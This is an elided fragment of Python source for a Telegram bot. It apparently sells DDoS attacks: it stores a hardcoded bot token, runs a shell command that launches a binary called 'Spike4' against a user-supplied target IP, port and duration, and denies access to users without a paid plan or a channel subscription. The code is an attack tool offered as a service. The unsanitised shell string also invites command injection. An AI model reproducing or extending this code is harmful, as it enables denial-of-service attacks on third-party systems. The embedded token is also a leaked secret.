...
TOKEN = '7542906508:AAE3LcXssyRlZZGD5fDaQRyHTWcHtSVCuBU'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./Spike4 {target_ip} {target_port} {duration} 10")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*First Subscribe Channel T.me/VirtualVenture_OG for access and*\n"
